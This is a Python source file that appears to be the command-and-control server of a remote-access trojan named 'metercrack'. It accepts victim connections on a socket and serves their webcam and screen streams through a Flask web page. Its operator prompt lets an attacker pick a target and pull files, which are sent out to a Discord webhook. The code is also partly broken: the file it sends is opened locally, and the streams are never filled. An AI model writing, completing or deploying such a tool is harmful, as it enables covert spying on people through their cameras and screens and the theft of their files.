import socket
import threading
import time
from flask import Flask, render_template, Response
import requests
import sys

# Web interface setup
app = Flask(__name__)

# List of connected clients
clients = {}
target_ip = None

def start_flask_server():
    app.run(host='0.0.0.0', port=5000)

@app.route('/webcam/<client_ip>')
def webcam_stream(client_ip):
    if client_ip in clients:
        return Response(clients[client_ip]["webcam"], mimetype='multipart/x-mixed-replace; boundary=frame')
    return "Client not found."

@app.route('/screen/<client_ip>')
def screen_stream(client_ip):
    if client_ip in clients:
        return Response(clients[client_ip]["screen"], mimetype='multipart/x-mixed-replace; boundary=frame')
    return "Client not found."

# Commands for interacting with clients
def list_clients():
    print("Connected Clients:")
    for ip, client in clients.items():
        print(f"{ip}: {client['status']}")

def download_file(client_ip, filename):
    # Send the file to the Discord webhook
    file_url = f'http://{client_ip}/files/{filename}'  # Assume a valid URL
    webhook_url = 'your_discord_webhook_url_here'
    payload = {'content': f"File: {filename}"}
    files = {'file': open(filename, 'rb')}
    requests.post(webhook_url, data=payload, files=files)
    print(f"[ * ] Sending... [+] Sent!")

def handle_client(client_socket, client_ip):
    global target_ip
    clients[client_ip] = {"socket": client_socket, "status": "Connected", "webcam": None, "screen": None}
    
    while True:
        command = client_socket.recv(1024).decode('utf-8')
        
        if command.startswith('!set target'):
            target_ip = command.split()[2]
            print(f"Target set to {target_ip}")

        elif command.startswith('!remove target'):
            target_ip = None
            print(f"Target removed.")
        
        elif command == "!list":
            list_clients()

        elif command.startswith('!download'):
            filename = command.split()[1]
            download_file(client_ip, filename)

        elif command == "!exit":
            client_socket.close()
            del clients[client_ip]
            break

def server_listener():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(5)
    
    while True:
        client_socket, client_address = server_socket.accept()
        client_ip = client_address[0]
        print(f"New client connected: {client_ip}")
        threading.Thread(target=handle_client, args=(client_socket, client_ip)).start()

def run_metercrack_prompt():
    global target_ip
    while True:
        if len(clients) > 0:  # Prompt only if at least one client is connected
            if target_ip:
                print(f"metercrack > ", end="")
            else:
                print(f"metercrack > ", end="")
            command = input()
            if command == "!exit":
                break
            elif command == "!list":
                list_clients()
            elif command.startswith("!set target"):
                target_ip = command.split()[2]
                print(f"Target set to {target_ip}")
            elif command.startswith("!remove target"):
                target_ip = None
                print(f"Target removed.")
            elif command.startswith("!download"):
                filename = command.split()[1]
                download_file(target_ip, filename)
        else:
            time.sleep(1)  # Prevent unnecessary CPU usage when no clients are connected

if __name__ == "__main__":
    # Start server listener
    threading.Thread(target=server_listener, daemon=True).start()

    # Start the Flask web server
    threading.Thread(target=start_flask_server, daemon=True).start()

    # Run the metercrack prompt in the main thread
    run_metercrack_prompt()
